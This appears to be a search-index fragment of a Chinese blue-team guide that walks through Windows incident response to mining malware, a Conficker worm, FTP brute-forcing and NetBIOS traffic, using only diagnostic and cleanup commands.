http://free.safedog.cn/server_safedog.html \u7f51\u7edc\u9632\u706b\u5899--\u653b\u51fb\u9632\u62a4--ARP\u9632\u706b\u5899\uff1a \u867d\u7136\u6709\u62e6\u622a\u4e86\u90e8\u5206ARP\u8bf7\u6c42\uff0c\u4f46\u6d41\u91cf\u51fa\u53e3\u8fd8\u662f\u6709\u4e00\u4e9b137 UDF\u7684\u6570\u636e\u5305\u3002 \u770b\u6765\u8fd8\u662f\u5f97\u4e0b\u72e0\u62db\uff0c\u5173\u95ed137\u7aef\u53e3\uff1a\u7981\u7528TCP/IP\u4e0a\u7684NetBIOS\u3002 1\uff09\u3001\u7981\u7528Server\u670d\u52a1 2\uff09\u3001\u7981\u7528 TCP/IP \u4e0a\u7684 NetBIOS \u8bbe\u7f6e\u5b8c\uff0c\u4e0d\u7528\u91cd\u542f\u5373\u53ef\u751f\u6548\uff0c137\u7aef\u53e3\u5173\u95ed\uff0c\u89c2\u5bdf\u4e86\u4e00\u4f1a\uff0c\u5bf9\u5916\u53d1\u8d77\u7684\u8bf7\u6c42\u5df2\u6d88\u5931\uff0cCPU\u548c\u7f51\u7edc\u5e26\u5bbd\u6062\u590d\u6b63\u5e38\u3002 0x04 \u9632\u62a4\u63aa\u65bd \u00b6 \u5c40\u57df\u7f51\u5b89\u5168\u9632\u62a4\u4f9d\u7136\u662f\u4e00\u9879\u5f88\u8270\u5de8\u7684\u4efb\u52a1\uff0c\u7f51\u7edc\u7684\u5b89\u5168\u7b56\u7565\uff0c\u4e2a\u4eba/\u670d\u52a1\u5668\u7684\u9632\u6bd2\u673a\u5236\uff0c\u53ef\u4ee5\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u9632\u6b62\u75c5\u6bd2\u5165\u4fb5\u3002 \u53e6\u5916\u4e0d\u7ba1\u662f\u4e2a\u4ebaPC\u8fd8\u662f\u670d\u52a1\u5668\uff0c\u603b\u8fd8\u662f\u9700\u8981\u505a\u4e00\u4e9b\u57fa\u672c\u7684\u5b89\u5168\u9632\u62a4\uff1a1\u3001\u5173\u95ed135/137/138/139/445\u7b49\u7aef\u53e3 2\u3001\u66f4\u65b0\u7cfb\u7edf\u8865\u4e01\u3002 \u7b2c5\u7bc7\uff1a\u6316\u77ff\u75c5\u6bd2\uff08\u4e00\uff09 \u00b6 0x00 \u524d\u8a00 \u00b6 \u968f\u7740\u865a\u62df\u8d27\u5e01\u7684\u75af\u72c2\u7092\u4f5c\uff0c\u6316\u77ff\u75c5\u6bd2\u5df2\u7ecf\u6210\u4e3a\u4e0d\u6cd5\u5206\u5b50\u5229\u7528\u6700\u4e3a\u9891\u7e41\u7684\u653b\u51fb\u65b9\u5f0f\u4e4b\u4e00\u3002\u75c5\u6bd2\u4f20\u64ad\u8005\u53ef\u4ee5\u5229\u7528\u4e2a\u4eba\u7535\u8111\u6216\u670d\u52a1\u5668\u8fdb\u884c\u6316\u77ff\uff0c\u5177\u4f53\u73b0\u8c61\u4e3a\u7535\u8111CPU\u5360\u7528\u7387\u9ad8\uff0cC\u76d8\u53ef\u4f7f\u7528\u7a7a\u95f4\u9aa4\u964d\uff0c\u7535\u8111\u6e29\u5ea6\u5347\u9ad8\uff0c\u98ce\u6247\u566a\u58f0\u589e\u5927\u7b49\u95ee\u9898\u3002 0x01 \u5e94\u6025\u573a\u666f \u00b6 \u67d0\u5929\u4e0a\u5348\u91cd\u542f\u670d\u52a1\u5668\u7684\u65f6\u5019\uff0c\u53d1\u73b0\u7a0b\u5e8f\u542f\u52a8\u5f88\u6162\uff0c\u6253\u5f00\u4efb\u52a1\u7ba1\u7406\u5668\uff0c\u53d1\u73b0cpu\u88ab\u5360\u7528\u63a5\u8fd1100%\uff0c\u670d\u52a1\u5668\u8d44\u6e90\u5360\u7528\u4e25\u91cd\u3002 0x02 \u4e8b\u4ef6\u5206\u6790 \u00b6 \u767b\u5f55\u7f51\u7ad9\u670d\u52a1\u5668\u8fdb\u884c\u6392\u67e5\uff0c\u53d1\u73b0\u591a\u4e2a\u5f02\u5e38\u8fdb\u7a0b\uff1a \u5206\u6790\u8fdb\u7a0b\u53c2\u6570\uff1a wmic process get caption,commandline /value >> tmp.txt TIPS: \u5728windows\u4e0b\u67e5\u770b\u67d0\u4e2a\u8fd0\u884c\u7a0b\u5e8f\uff08\u6216\u8fdb\u7a0b\uff09\u7684\u547d\u4ee4\u884c\u53c2\u6570 \u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\uff1a wmic process get caption,commandline /value \u5982\u679c\u60f3\u67e5\u8be2\u67d0\u4e00\u4e2a\u8fdb\u7a0b\u7684\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u4f7f\u7528\u4e0b\u5217\u65b9\u5f0f\uff1a wmic process where caption=\u201dsvchost.exe\u201d get caption,commandline /value \u8fd9\u6837\u5c31\u53ef\u4ee5\u5f97\u5230\u8fdb\u7a0b\u7684\u53ef\u6267\u884c\u6587\u4ef6\u4f4d\u7f6e\u7b49\u4fe1\u606f\u3002 \u8bbf\u95ee\u8be5\u94fe\u63a5\uff1a Temp\u76ee\u5f55\u4e0b\u53d1\u73b0Carbon\u3001run.bat\u6316\u77ff\u7a0b\u5e8f: \u5177\u4f53\u6280\u672f\u5206\u6790\u7ec6\u8282\u8be6\u89c1\uff1a 360CERT\uff1a\u5229\u7528WebLogic\u6f0f\u6d1e\u6316\u77ff\u4e8b\u4ef6\u5206\u6790 https://www.anquanke.com/post/id/92223 \u6e05\u9664\u6316\u77ff\u75c5\u6bd2\uff1a\u5173\u95ed\u5f02\u5e38\u8fdb\u7a0b\u3001\u5220\u9664c\u76d8temp\u76ee\u5f55\u4e0b\u6316\u77ff\u7a0b\u5e8f \u3002 \u4e34\u65f6\u9632\u62a4\u65b9\u6848 \u6839\u636e\u5b9e\u9645\u73af\u5883\u8def\u5f84\uff0c\u5220\u9664WebLogic\u7a0b\u5e8f\u4e0b\u5217war\u5305\u53ca\u76ee\u5f55 rm -f /home/WebLogic/Oracle/Middleware/wlserver_10.3/server/lib/wls-wsat.war rm -f /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war rm -rf /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat \u91cd\u542fWebLogic\u6216\u7cfb\u7edf\u540e\uff0c\u786e\u8ba4\u4ee5\u4e0b\u94fe\u63a5\u8bbf\u95ee\u662f\u5426\u4e3a404 http://x.x.x.x:7001/wls-wsat 0x04 \u9632\u8303\u63aa\u65bd \u00b6 \u65b0\u7684\u6316\u77ff\u653b\u51fb\u5c55\u73b0\u51fa\u4e86\u7c7b\u4f3c\u8815\u866b\u7684\u884c\u4e3a\uff0c\u5e76\u7ed3\u5408\u4e86\u9ad8\u7ea7\u653b\u51fb\u6280\u672f\uff0c\u4ee5\u589e\u52a0\u5bf9\u76ee\u6807\u670d\u52a1\u5668\u611f\u67d3\u7684\u6210\u529f\u7387\u3002\u901a\u8fc7\u5229\u7528\u6c38\u6052\u4e4b\u84dd\uff08EternalBlue\uff09\u3001web\u653b\u51fb\u591a\u79cd\u6f0f\u6d1e\uff0c\u5982Tomcat\u5f31\u53e3\u4ee4\u653b\u51fb\u3001Weblogic WLS\u7ec4\u4ef6\u6f0f\u6d1e\u3001Jboss\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0cStruts2\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u7b49\uff0c\u5bfc\u81f4\u5927\u91cf\u670d\u52a1\u5668\u88ab\u611f\u67d3\u6316\u77ff\u7a0b\u5e8f\u7684\u73b0\u8c61 \u3002\u603b\u7ed3\u4e86\u51e0\u79cd\u9884\u9632\u63aa\u65bd\uff1a 1\u3001\u5b89\u88c5\u5b89\u5168\u8f6f\u4ef6\u5e76\u5347\u7ea7\u75c5\u6bd2\u5e93\uff0c\u5b9a\u671f\u5168\u76d8\u626b\u63cf\uff0c\u4fdd\u6301\u5b9e\u65f6\u9632\u62a4 2\u3001\u53ca\u65f6\u66f4\u65b0 Windows\u5b89\u5168\u8865\u4e01\uff0c\u5f00\u542f\u9632\u706b\u5899\u4e34\u65f6\u5173\u95ed\u7aef\u53e3 3\u3001\u53ca\u65f6\u66f4\u65b0web\u6f0f\u6d1e\u8865\u4e01\uff0c\u5347\u7ea7web\u7ec4\u4ef6 \u7b2c6\u7bc7\uff1a\u6316\u77ff\u75c5\u6bd2\uff08\u4e8c\uff09 \u00b6 0x00 \u524d\u8a00 \u00b6 \u4f5c\u4e3a\u4e00\u4e2a\u8fd0\u7ef4\u5de5\u7a0b\u5e08\uff0c\u800c\u975e\u4e00\u4e2a\u4e13\u4e1a\u7684\u75c5\u6bd2\u5206\u6790\u5de5\u7a0b\u5e08\uff0c\u9047\u5230\u4e86\u6bd4\u8f83\u590d\u6742\u7684\u75c5\u6bd2\u600e\u4e48\u529e\uff1f\u522b\u6015\uff0c\u867d\u7136\u5bf9\u4e8c\u8fdb\u5236\u4e0d\u719f\uff0c\u4f46\u662f\u4f9d\u9760\u7cfb\u7edf\u8fd0\u7ef4\u7684\u7ecf\u9a8c\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u81ea\u5df1\u7684\u65b9\u5f0f\u6765\u89e3\u51b3\u5b83\u3002 0x01 \u611f\u67d3\u73b0\u8c61 \u00b6 1\u3001\u5411\u5927\u91cf\u8fdc\u7a0bIP\u7684445\u7aef\u53e3\u53d1\u9001\u8bf7\u6c42 2\u3001\u4f7f\u7528\u5404\u79cd\u6740\u6bd2\u8f6f\u4ef6\u67e5\u6740\u65e0\u679c\uff0c\u867d\u7136\u80fd\u8bc6\u522b\u51fa\u5728C:\\Windows\\NerworkDistribution\u4e2d\u53d1\u73b0\u5f02\u5e38\u6587\u4ef6\uff0c\u4f46\u5373\u4f7f\u5220\u9664NerworkDistribution\u540e\uff0c\u6bcf\u6b21\u91cd\u542f\u53c8\u4f1a\u518d\u6b21\u751f\u6210\u3002 \u8fde\u6740\u8f6f\u6e05\u9664\u4e0d\u4e86\u7684\u75c5\u6bd2\uff0c\u53ea\u80fd\u624b\u5de5\u6765\u5427\uff0c\u4e2a\u4eba\u6bd4\u8f83\u504f\u597d\u706b\u7ed2\uff0c\u754c\u9762\u6bd4\u8f83\u7b80\u6d01\uff0c\u529f\u80fd\u4e5f\u633a\u597d\u7528\u7684\uff0c\u81ea\u5e26\u7684\u706b\u7ed2\u5251\u662f\u5b89\u5168\u5206\u6790\u5229\u5668\u3002\u4e8e\u662f\u5b89\u88c5\u4e86\u706b\u7ed2\uff0c\u6709\u4e86\u5982\u4e0b\u5206\u6790\u6392\u67e5\u8fc7\u7a0b\u3002 0x02 \u4e8b\u4ef6\u5206\u6790 \u00b6 A\u3001\u7f51\u7edc\u94fe\u63a5 \u00b6 \u901a\u8fc7\u73b0\u8c61\uff0c\u627e\u5230\u5bf9\u5916\u53d1\u9001\u8bf7\u6c42\u7684\u8fdb\u7a0bID\uff1a4960 B\u3001\u8fdb\u7a0b\u5206\u6790 \u00b6 \u8fdb\u4e00\u6b65\u901a\u8fc7\u8fdb\u7a0bID\u627e\u5230\u76f8\u5173\u8054\u7684\u8fdb\u7a0b\uff0c\u7236\u8fdb\u7a0b\u4e3a1464 \u627e\u5230\u8fdb\u7a0bID\u4e3a1464\u7684\u670d\u52a1\u9879\uff0c\u9010\u4e00\u6392\u67e5\uff0c\u6211\u4eec\u53d1\u73b0\u670d\u52a1\u9879RemoteUPnPService\u5b58\u5728\u5f02\u5e38\u3002 C\u3001\u5220\u9664\u670d\u52a1 \u00b6 \u9009\u62e9\u53ef\u7591\u670d\u52a1\u9879\uff0c\u53f3\u952e\u5c5e\u6027\uff0c\u505c\u6b62\u670d\u52a1\uff0c\u542f\u52a8\u7c7b\u578b\uff1a\u7981\u6b62\u3002 \u505c\u6b62\u5e76\u7981\u7528\u670d\u52a1\uff0c\u518d\u6e05\u9664NerworkDistribution\u76ee\u5f55\u540e\uff0c\u91cd\u542f\u8ba1\u7b97\u673a\u3002\u5f02\u5e38\u8bf7\u6c42\u548c\u76ee\u5f55\u7684\u73b0\u8c61\u6d88\u5931\u3002 \u53c8\u6392\u67e5\u4e86\u51e0\u53f0\uff0c\u73b0\u8c61\u4e00\u81f4\uff0c\u5c31\u662f\u670d\u52a1\u9879\u7684\u540d\u79f0\u6709\u70b9\u53d8\u5316\u3002 D\u3001\u75c5\u6bd2\u6e05\u9664 \u00b6 \u6316\u77ff\u75c5\u6bd2\u6e05\u9664\u8fc7\u7a0b\u5982\u4e0b\uff1a 1\u3001 \u505c\u6b62\u5e76\u7981\u7528\u53ef\u7591\u7684\u670d\u52a1\u9879\uff0c\u670d\u52a1\u9879\u7684\u540d\u79f0\u4f1a\u53d8\uff0c\u4f46\u63cf\u8ff0\u662f\u4e0d\u53d8\u7684\uff0c\u6839\u636e\u63cf\u8ff0\u53ef\u5feb\u901f\u627e\u5230\u53ef\u7591\u670d\u52a1\u9879\u3002 \u53ef\u7591\u670d\u52a1\u9879\u63cf\u8ff0\uff1aEnables a common interface and object model for the Remote UPnP Service to access \u5220\u9664\u670d\u52a1\u9879\uff1aSc delete RemoteUPnPService 2\u3001 \u5220\u9664C:\\Windows\\NerworkDistribution\u76ee\u5f55 3\u3001 \u91cd\u542f\u8ba1\u7b97\u673a 4\u3001 \u4f7f\u7528\u6740\u6bd2\u8f6f\u4ef6\u5168\u76d8\u67e5\u6740 5\u3001 \u5230\u5fae\u8f6f\u5b98\u65b9\u7f51\u7ad9\u4e0b\u8f7d\u5bf9\u5e94\u64cd\u4f5c\u7cfb\u7edf\u8865\u4e01\uff0c\u4e0b\u8f7d\u94fe\u63a5\uff1a https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010 0x03 \u540e\u8bb0 \u00b6 \u5728\u67e5\u8be2\u4e86\u5927\u91cf\u8d44\u6599\u540e\uff0c\u627e\u5230\u4e86\u4e00\u7bc7\u57282018\u5e742\u6708\u6709\u5173\u8be5\u75c5\u6bd2\u7684\u62a5\u544a\uff1a NrsMiner\uff1a\u4e00\u4e2a\u6784\u9020\u7cbe\u5bc6\u7684\u6316\u77ff\u50f5\u5c38\u7f51\u7edc https://www.freebuf.com/articles/system/162874.html \u6839\u636e\u6587\u7ae0\u63d0\u793a\uff0c\u8fd9\u4e2a\u75c5\u6bd2\u7684\u6784\u9020\u975e\u5e38\u7684\u590d\u6742\uff0c\u4e3b\u63a7\u6a21\u5757\u4f5c\u4e3a\u670d\u52a1\u201cHyper-VAccess Protection Agent Service\u201d\u7684ServiceDll\u5b58\u5728\u3002\u4f46\u4e0e\u76ee\u524d\u5904\u7406\u7684\u60c5\u51b5\u6709\u6240\u4e0d\u540c\uff0c\u8be5\u75c5\u6bd2\u7591\u4f3c\u662f\u5347\u7ea7\u4e86\u3002","title":"Windows\u5b9e\u6218"},{"location":"blueteam/windows%E5%AE%9E%E6%88%98/#1ftp","text":"","title":"\u7b2c1\u7bc7\uff1aFTP\u66b4\u529b\u7834\u89e3"},{"location":"blueteam/windows%E5%AE%9E%E6%88%98/#0x00","text":"FTP\u662f\u4e00\u4e2a\u6587\u4ef6\u4f20\u8f93\u534f\u8bae\uff0c\u7528\u6237\u901a\u8fc7FTP\u53ef\u4ece\u5ba2\u6237\u673a\u7a0b\u5e8f\u5411\u8fdc\u7a0b\u4e3b\u673a\u4e0a\u4f20\u6216\u4e0b\u8f7d\u6587\u4ef6\uff0c\u5e38\u7528\u4e8e\u7f51\u7ad9\u4ee3\u7801\u7ef4\u62a4\u3001\u65e5\u5e38\u6e90\u7801\u5907\u4efd\u7b49\u3002\u5982\u679c\u653b\u51fb\u8005\u901a\u8fc7FTP\u533f\u540d\u8bbf\u95ee\u6216\u8005\u5f31\u53e3\u4ee4\u83b7\u53d6FTP\u6743\u9650\uff0c\u53ef\u76f4\u63a5\u4e0a\u4f20webshell\uff0c\u8fdb\u4e00\u6b65\u6e17\u900f\u63d0\u6743\uff0c\u76f4\u81f3\u63a7\u5236\u6574\u4e2a\u7f51\u7ad9\u670d\u52a1\u5668\u3002","title":"0x00 \u524d\u8a00"},{"location":"blueteam/windows%E5%AE%9E%E6%88%98/#0x01","text":"\u4ece\u6628\u5929\u5f00\u59cb\uff0c\u7f51\u7ad9\u54cd\u5e94\u901f\u5ea6\u53d8\u5f97\u7f13\u6162\uff0c\u7f51\u7ad9\u670d\u52a1\u5668\u767b\u5f55\u4e0a\u53bb\u975e\u5e38\u5361\uff0c\u91cd\u542f\u670d\u52a1\u5668\u5c31\u80fd\u4fdd\u8bc1\u4e00\u6bb5\u65f6\u95f4\u7684\u6b63\u5e38\u8bbf\u95ee\uff0c\u7f51\u7ad9\u54cd\u5e94\u72b6\u6001\u65f6\u800c\u98de\u5feb\u65f6\u800c\u7f13\u6162\uff0c\u591a\u6570\u65f6\u95f4\u662f\u7f13\u6162\u7684\u3002\u9488\u5bf9\u7f51\u7ad9\u670d\u52a1\u5668\u5f02\u5e38\uff0c\u7cfb\u7edf\u65e5\u5fd7\u548c\u7f51\u7ad9\u65e5\u5fd7\uff0c\u662f\u6211\u4eec\u6392\u67e5\u5904\u7406\u7684\u91cd\u70b9\u3002\u67e5\u770bWindow\u5b89\u5168\u65e5\u5fd7\uff0c\u53d1\u73b0\u5927\u91cf\u7684\u767b\u5f55\u5931\u8d25\u8bb0\u5f55\uff1a","title":"0x01 \u5e94\u6025\u573a\u666f"},{"location":"blueteam/windows%E5%AE%9E%E6%88%98/#0x02","text":"\u5b89\u5168\u65e5\u5fd7\u5206\u6790\uff1a \u5b89\u5168\u65e5\u5fd7\u8bb0\u5f55\u7740\u4e8b\u4ef6\u5ba1\u8ba1\u4fe1\u606f\uff0c\u5305\u62ec\u7528\u6237\u9a8c\u8bc1\uff08\u767b\u5f55\u3001\u8fdc\u7a0b\u8bbf\u95ee\u7b49\uff09\u548c\u7279\u5b9a\u7528\u6237\u5728\u8ba4\u8bc1\u540e\u5bf9\u7cfb\u7edf\u505a\u4e86\u4ec0\u4e48\u3002 \u6253\u5f00\u5b89\u5168\u65e5\u5fd7\uff0c\u5728\u53f3\u8fb9\u70b9\u51fb\u7b5b\u9009\u5f53\u524d\u65e5\u5fd7\uff0c \u5728\u4e8b\u4ef6ID\u586b\u51654625\uff0c\u67e5\u8be2\u5230\u4e8b\u4ef6ID4625\uff0c\u4e8b\u4ef6\u6570177007\uff0c\u4ece\u8fd9\u4e2a\u6570\u636e\u53ef\u4ee5\u770b\u51fa\uff0c\u670d\u52a1\u5668\u6b63\u5219\u906d\u53d7\u66b4\u529b\u7834\u89e3\uff1a \u8fdb\u4e00\u6b65\u4f7f\u7528Log Parser\u5bf9\u65e5\u5fd7\u63d0\u53d6\u6570\u636e\u5206\u6790\uff0c\u53d1\u73b0\u653b\u51fb\u8005\u4f7f\u7528\u4e86\u5927\u91cf\u7684\u7528\u6237\u540d\u8fdb\u884c\u7206\u7834\uff0c\u4f8b\u5982\u7528\u6237\u540d\uff1afxxx\uff0c\u5171\u8ba1\u8fdb\u884c\u4e8617826\u6b21\u53e3\u4ee4\u5c1d\u8bd5\uff0c\u653b\u51fb\u8005\u57fa\u4e8e\u201cfxxx\u201d\u8fd9\u6837\u4e00\u4e2a\u57df\u540d\u4fe1\u606f\uff0c\u6784\u9020\u4e86\u4e00\u7cfb\u5217\u7684\u7528\u6237\u540d\u5b57\u5178\u8fdb\u884c\u6709\u9488\u5bf9\u6027\u8fdb\u884c\u7206\u7834\uff0c\u5982\u4e0b\u56fe\uff1a \u8fd9\u91cc\u6211\u4eec\u7559\u610f\u5230\u767b\u5f55\u7c7b\u578b\u4e3a8\uff0c\u6765\u4e86\u89e3\u4e00\u4e0b\u767b\u5f55\u7c7b\u578b8\u662f\u4ec0\u4e48\u610f\u601d\u5462\uff1f \u767b\u5f55\u7c7b\u578b8\uff1a\u7f51\u7edc\u660e\u6587\uff08NetworkCleartext\uff09 \u8fd9\u79cd\u767b\u5f55\u8868\u660e\u8fd9\u662f\u4e00\u4e2a\u50cf\u7c7b\u578b3\u4e00\u6837\u7684\u7f51\u7edc\u767b\u5f55\uff0c\u4f46\u662f\u8fd9\u79cd\u767b\u5f55\u7684\u5bc6\u7801\u5728\u7f51\u7edc\u4e0a\u662f\u901a\u8fc7\u660e\u6587\u4f20\u8f93\u7684\uff0cWindowsServer\u670d\u52a1\u662f\u4e0d\u5141\u8bb8\u901a\u8fc7\u660e\u6587\u9a8c\u8bc1\u8fde\u63a5\u5230\u5171\u4eab\u6587\u4ef6\u5939\u6216\u6253\u5370\u673a\u7684\uff0c\u636e\u6211\u6240\u77e5\u53ea\u6709\u5f53\u4ece\u4e00\u4e2a\u4f7f\u7528Advapi\u7684ASP\u811a\u672c\u767b\u5f55\u6216\u8005\u4e00\u4e2a\u7528\u6237\u4f7f\u7528\u57fa\u672c\u9a8c\u8bc1\u65b9\u5f0f\u767b\u5f55IIS\u624d\u4f1a\u662f\u8fd9\u79cd\u767b\u5f55\u7c7b\u578b\u3002\u201c\u767b\u5f55\u8fc7\u7a0b\u201d\u680f\u90fd\u5c06\u5217\u51faAdvapi\u3002 \u6211\u4eec\u63a8\u6d4b\u53ef\u80fd\u662fFTP\u670d\u52a1\uff0c\u901a\u8fc7\u67e5\u770b\u7aef\u53e3\u670d\u52a1\u53ca\u7ba1\u7406\u5458\u8bbf\u8c08\uff0c\u786e\u8ba4\u670d\u52a1\u5668\u786e\u5b9e\u5bf9\u516c\u7f51\u5f00\u653e\u4e86FTP\u670d\u52a1\u3002 \u53e6\u5916\uff0c\u65e5\u5fd7\u5e76\u672a\u8bb0\u5f55\u66b4\u529b\u7834\u89e3\u7684IP\u5730\u5740\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528Wireshark\u5bf9\u6355\u83b7\u5230\u7684\u6d41\u91cf\u8fdb\u884c\u5206\u6790\uff0c\u83b7\u53d6\u5230\u6b63\u5728\u8fdb\u884c\u7206\u7834\u7684IP\uff1a \u901a\u8fc7\u5bf9\u8fd1\u6bb5\u65f6\u95f4\u7684\u7ba1\u7406\u5458\u767b\u5f55\u65e5\u5fd7\u8fdb\u884c\u5206\u6790\uff0c\u5982\u4e0b\uff1a \u7ba1\u7406\u5458\u767b\u5f55\u6b63\u5e38\uff0c\u5e76\u672a\u53d1\u73b0\u5f02\u5e38\u767b\u5f55\u65f6\u95f4\u548c\u5f02\u5e38\u767b\u5f55ip\uff0c\u8fd9\u91cc\u7684\u767b\u5f55\u7c7b\u578b10\uff0c\u4ee3\u8868\u8fdc\u7a0b\u7ba1\u7406\u684c\u9762\u767b\u5f55\u3002 \u53e6\u5916\uff0c\u901a\u8fc7\u67e5\u770bFTP\u7ad9\u70b9\uff0c\u53d1\u73b0\u53ea\u6709\u4e00\u4e2a\u6d4b\u8bd5\u6587\u4ef6\uff0c\u4e0e\u7ad9\u70b9\u76ee\u5f55\u5e76\u4e0d\u5728\u540c\u4e00\u4e2a\u76ee\u5f55\u4e0b\u9762\uff0c\u8fdb\u4e00\u6b65\u9a8c\u8bc1\u4e86FTP\u66b4\u529b\u7834\u89e3\u5e76\u672a\u6210\u529f\u3002 \u5e94\u6025\u5904\u7406\u63aa\u65bd\uff1a1\u3001\u5173\u95ed\u5916\u7f51FTP\u7aef\u53e3\u6620\u5c04 2\u3001\u5220\u9664\u672c\u5730\u670d\u52a1\u5668FTP\u6d4b\u8bd5","title":"0x02 \u65e5\u5fd7\u5206\u6790"},{"location":"blueteam/windows%E5%AE%9E%E6%88%98/#0x04","text":"FTP\u66b4\u529b\u7834\u89e3\u4f9d\u7136\u5341\u5206\u666e\u904d\uff0c\u5982\u4f55\u4fdd\u62a4\u670d\u52a1\u5668\u4e0d\u53d7\u66b4\u529b\u7834\u89e3\u653b\u51fb\uff0c\u603b\u7ed3\u4e86\u51e0\u79cd\u63aa\u65bd\uff1a 1\u3001\u7981\u6b62\u4f7f\u7528FTP\u4f20\u8f93\u6587\u4ef6\uff0c\u82e5\u5fc5\u987b\u5f00\u653e\u5e94\u9650\u5b9a\u7ba1\u7406IP\u5730\u5740\u5e76\u52a0\u5f3a\u53e3\u4ee4\u5b89\u5168\u5ba1\u8ba1\uff08\u53e3\u4ee4\u957f\u5ea6\u4e0d\u4f4e\u4e8e8\u4f4d\uff0c\u7531\u6570\u5b57\u3001\u5927\u5c0f\u5199\u5b57\u6bcd\u3001\u7279\u6b8a\u5b57\u7b26\u7b49\u81f3\u5c11\u4e24\u79cd\u4ee5\u4e0a\u7ec4\u5408\u6784\u6210\uff09\u3002 2\u3001\u66f4\u6539\u670d\u52a1\u5668FTP\u9ed8\u8ba4\u7aef\u53e3\u3002 3\u3001\u90e8\u7f72\u5165\u4fb5\u68c0\u6d4b\u8bbe\u5907\uff0c\u589e\u5f3a\u5b89\u5168\u9632\u62a4\u3002","title":"0x04 \u5904\u7406\u63aa\u65bd"},{"location":"blueteam/windows%E5%AE%9E%E6%88%98/#2","text":"","title":"\u7b2c2\u7bc7\uff1a\u8815\u866b\u75c5\u6bd2"},{"location":"blueteam/windows%E5%AE%9E%E6%88%98/#0x00_1","text":"\u8815\u866b\u75c5\u6bd2\u662f\u4e00\u79cd\u5341\u5206\u53e4\u8001\u7684\u8ba1\u7b97\u673a\u75c5\u6bd2\uff0c\u5b83\u662f\u4e00\u79cd\u81ea\u5305\u542b\u7684\u7a0b\u5e8f\uff08\u6216\u662f\u4e00\u5957\u7a0b\u5e8f\uff09\uff0c\u901a\u5e38\u901a\u8fc7\u7f51\u7edc\u9014\u5f84\u4f20\u64ad\uff0c\u6bcf\u5165\u4fb5\u5230\u4e00\u53f0\u65b0\u7684\u8ba1\u7b97\u673a\uff0c\u5b83\u5c31\u5728\u8fd9\u53f0\u8ba1\u7b97\u673a\u4e0a\u590d\u5236\u81ea\u5df1\uff0c\u5e76\u81ea\u52a8\u6267\u884c\u5b83\u81ea\u8eab\u7684\u7a0b\u5e8f\u3002 \u5e38\u89c1\u7684\u8815\u866b\u75c5\u6bd2\uff1a\u718a\u732b\u70e7\u9999\u75c5\u6bd2 \u3001\u51b2\u51fb\u6ce2/\u9707\u8361\u6ce2\u75c5\u6bd2\u3001conficker\u75c5\u6bd2\u7b49\u3002","title":"0x00 \u524d\u8a00"},{"location":"blueteam/windows%E5%AE%9E%E6%88%98/#0x01_1","text":"\u67d0\u5929\u65e9\u4e0a\uff0c\u7ba1\u7406\u5458\u5728\u51fa\u53e3\u9632\u706b\u5899\u53d1\u73b0\u5185\u7f51\u670d\u52a1\u5668\u4e0d\u65ad\u5411\u5883\u5916IP\u53d1\u8d77\u4e3b\u52a8\u8fde\u63a5\uff0c\u5185\u7f51\u73af\u5883\uff0c\u65e0\u6cd5\u8fde\u901a\u5916\u7f51\uff0c\u65e0\u56fe\u8111\u8865\u3002","title":"0x01 \u5e94\u6025\u573a\u666f"},{"location":"blueteam/windows%E5%AE%9E%E6%88%98/#0x02_1","text":"\u5728\u51fa\u53e3\u9632\u706b\u5899\u770b\u5230\u7684\u670d\u52a1\u5668\u5185\u7f51IP\uff0c\u9996\u5148\u5c06\u4e2d\u75c5\u6bd2\u7684\u4e3b\u673a\u4ece\u5185\u7f51\u65ad\u5f00\uff0c\u7136\u540e\u767b\u5f55\u8be5\u670d\u52a1\u5668\uff0c\u6253\u5f00D\u76fe_web\u67e5\u6740\u67e5\u770b\u7aef\u53e3\u8fde\u63a5\u60c5\u51b5\uff0c\u53ef\u4ee5\u53d1\u73b0\u672c\u5730\u5411\u5916\u7f51IP\u53d1\u8d77\u5927\u91cf\u7684\u4e3b\u52a8\u8fde\u63a5\uff1a \u901a\u8fc7\u7aef\u53e3\u5f02\u5e38\uff0c\u8ddf\u8e2a\u8fdb\u7a0bID\uff0c\u53ef\u4ee5\u627e\u5230\u8be5\u5f02\u5e38\u7531svchost.exe windows\u670d\u52a1\u4e3b\u8fdb\u7a0b\u5f15\u8d77\uff0csvchost.exe\u5411\u5927\u91cf\u8fdc\u7a0bIP\u7684445\u7aef\u53e3\u53d1\u9001\u8bf7\u6c42\uff1a \u8fd9\u91cc\u6211\u4eec\u63a8\u6d4b\u53ef\u4ee5\u7cfb\u7edf\u8fdb\u7a0b\u88ab\u75c5\u6bd2\u611f\u67d3\uff0c\u4f7f\u7528\u5361\u5df4\u65af\u57fa\u75c5\u6bd2\u67e5\u6740\u5de5\u5177\uff0c\u5bf9\u5168\u76d8\u6587\u4ef6\u8fdb\u884c\u67e5\u6740\uff0c\u53d1\u73b0c:\\windows\\system32\\qntofmhz.dll\u5f02\u5e38\uff1a \u4f7f\u7528\u591a\u5f15\u64ce\u5728\u7ebf\u75c5\u6bd2\u626b\u63cf\uff08 http://www.virscan.org/ \uff09 \u5bf9\u8be5\u6587\u4ef6\u8fdb\u884c\u626b\u63cf: \u786e\u8ba4\u670d\u52a1\u5668\u611f\u67d3conficker\u8815\u866b\u75c5\u6bd2\uff0c\u4e0b\u8f7dconficker\u8815\u866b\u4e13\u6740\u5de5\u5177\u5bf9\u670d\u52a1\u5668\u8fdb\u884c\u6e05\u67e5\uff0c\u6210\u529f\u6e05\u695a\u75c5\u6bd2\u3002 \u5927\u81f4\u7684\u5904\u7406\u6d41\u7a0b\u5982\u4e0b: 1\u3001\u53d1\u73b0\u5f02\u5e38\uff1a\u51fa\u53e3\u9632\u706b\u5899\u3001\u672c\u5730\u7aef\u53e3\u8fde\u63a5\u60c5\u51b5\uff0c\u4e3b\u52a8\u5411\u5916\u7f51\u53d1\u8d77\u5927\u91cf\u8fde\u63a5 